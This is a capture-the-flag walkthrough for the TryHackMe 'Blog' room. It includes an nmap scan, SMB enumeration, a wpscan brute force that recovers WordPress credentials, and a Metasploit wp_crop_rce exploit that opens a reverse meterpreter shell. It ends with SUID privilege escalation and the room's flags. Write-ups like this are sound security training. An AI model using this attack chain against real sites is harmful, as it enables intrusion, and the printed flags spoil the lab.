# Blog

Blog - Linux - Medium

https://tryhackme.com/room/blog

Nmap scan

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 16:30 IST
Nmap scan report for 10.10.241.16
Host is up (0.15s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 578ada90baed3a470c05a3f7a80a8d78 (RSA)
|   256 c264efabb19a1c87587c4bd50f204626 (ECDSA)
|_  256 5af26292118ead8a9b23822dad53bc16 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 5.0
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -5h29m57s, deviation: 0s, median: -5h29m57s
| smb2-time: 
|   date: 2023-06-01T05:31:18
|_  start_date: N/A
|_nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: blog
|   NetBIOS computer name: BLOG\x00
|   Domain name: \x00
|   FQDN: blog
|_  System time: 2023-06-01T05:31:18+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.85 seconds
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


There is samba service, let's see what is inside it


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌─[user@parrot]─[~/Desktop/hacking/tryhackme/blog]
└──╼ $smbclient //10.10.241.16/BillySMB
Password for [WORKGROUP\user]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue May 26 23:47:05 2020
  ..                                  D        0  Tue May 26 23:28:23 2020
  Alice-White-Rabbit.jpg              N    33378  Tue May 26 23:47:01 2020
  tswift.mp4                          N  1236733  Tue May 26 23:43:45 2020
  check-this.png                      N     3082  Tue May 26 23:43:43 2020

		15413192 blocks of size 1024. 9788760 blocks available
smb: \> get check-this.png 
getting file \check-this.png of size 3082 as check-this.png (3.4 KiloBytes/sec) (average 3.4 KiloBytes/sec)
smb: \> get tswift.mp4 
getting file \tswift.mp4 of size 1236733 as tswift.mp4 (282.8 KiloBytes/sec) (average 235.1 KiloBytes/sec)
smb: \> get Alice-White-Rabbit.jpg 
getting file \Alice-White-Rabbit.jpg of size 33378 as Alice-White-Rabbit.jpg (31.7 KiloBytes/sec) (average 201.3 KiloBytes/sec)
smb: \> 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Scan the url using wpscan and bruteforce username/password 

`wpscan --url blog.thm --passwords /usr/share/wordlists/rockyou.txt  --max-threads 50`

and we got the username and password
[SUCCESS] - kwheel / cutiepie1 

There is an epxloit for wordpress 5.0 which requires username, password, theme name in order to execute

Exploit - https://www.exploit-db.com/exploits/49512

using metasploit, we can easily exploit them


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[msf](Jobs:0 Agents:0) exploit(multi/http/wp_crop_rce) >> show options

Module options (exploit/multi/http/wp_crop_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   cutiepie1        yes       The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     blog.thm         yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   THEME_DIR                   no        The WordPress theme dir name (disable theme auto-detection if provided)
   USERNAME   kwheel           yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.8.95.227      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WordPress



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(multi/http/wp_crop_rce) >> exploit

[*] Started reverse TCP handler on 10.8.95.227:4444 
[*] Authenticating with WordPress using kwheel:cutiepie1...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload
[+] Image uploaded
[*] Including into theme
[*] Sending stage (39927 bytes) to 10.10.88.45
[*] Meterpreter session 1 opened (10.8.95.227:4444 -> 10.10.88.45:35988) at 2023-06-01 17:50:17 +0530
[*] Attempting to clean up files...

(Meterpreter 1)(/var/www/wordpress) > ls
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


use `shell` in order to switch to shell

Exploit
1. use `find / -perm -u=s -type f 2>/dev/null` to find suid binary
2. there is a checker binary, after decompiling it in ghidra we get to know that it is checking for environment variable
3. after adding env, we can execute it and it will switch to root.



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@blog:/root# cat root.txt
cat root.txt
9a0b2b618bef9bfa7ac28c1353d9f318

root@blog:/root# find / -name user.txt
find / -name user.txt
/home/bjoel/user.txt
/media/usb/user.txt

cat /media/usb/user.txt
c8421899aae571f7af486492b71a8ab7
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~